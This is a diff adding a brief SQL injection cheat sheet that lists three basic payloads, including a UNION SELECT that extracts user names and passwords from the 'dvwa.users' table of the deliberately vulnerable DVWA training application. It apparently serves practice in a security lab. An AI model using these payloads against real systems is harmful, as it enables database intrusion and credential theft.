@@ -1,1 +1,19 @@
+SQL INJECTION CHEATSHEET
+
+PAYLOADS
+
+BASICS
+'
+test' or 1=1#
+’ or 1=1 UNION SELECT user, password from dvwa.users#
+
+
+
+
+
+
+
+
+
+
 
